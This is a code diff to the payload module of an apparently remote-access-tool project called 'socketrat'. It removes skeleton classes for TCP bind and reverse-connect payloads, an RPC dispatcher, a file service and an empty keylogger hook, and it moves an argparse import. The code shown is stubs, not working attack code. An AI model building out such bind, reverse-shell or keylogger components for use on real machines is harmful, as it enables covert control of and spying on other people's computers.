@@ -1,59 +1,7 @@
 # -*- coding: utf-8 -*-
 
+import argparse
 import platform
-import socket
-import socketserver
-import sys
-
-from .. import connection
-from .. import rpc
-
-from . import *
-
-
-class PayloadRPCDispatcher(rpc.RPCHandler):
-    ''' Mix-in class that dispatches RPC requests. '''
-
-    def rpc_dir(self):
-        return list(self._functions)
-
-    def rpc_echo(self, s):
-        return s
-
-    def register_file_service(self, mode):
-        pass
-
-    def register_keylogger(self):
-        pass
-
-
-class PayloadRequestHandler(socketserver.BaseRequestHandler):
-
-    def handle(self):
-        self.server.handle_socket(self.request)
-
-
-class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):
-
-    def __init__(self, addr, requestHandler=PayloadRequestHandler,
-            logRequests=True, allow_none=False, encoding=None,
-            bind_and_activate=True, use_builtin_types=False):
-        self.logRequests = logRequests
-
-        #PayloadRPCDispatcher.__init__(self, allow_none, encoding, use_builtin_types)
-        PayloadRPCDispatcher.__init__(self)
-        socketserver.TCPServer.__init__(self, addr, requestHandler, bind_and_activate)
-
-
-class TCPReversePayload(TCPClient, PayloadRPCDispatcher):
-    
-    def __init__(self, addr):
-        self.address = addr
-        self.retry_interval = 1
-
-
-class FileService(FileOpener, FileReader, FileWriter):
-    pass
 
 
 def _linux_connect(args):
@@ -89,8 +37,6 @@ def _windows_main(args):
 
 
 def _linux_main(args):
-    import argparse
-
     parser = argparse.ArgumentParser(
             prog='socketrat.payload',
             prefix_chars='-+',
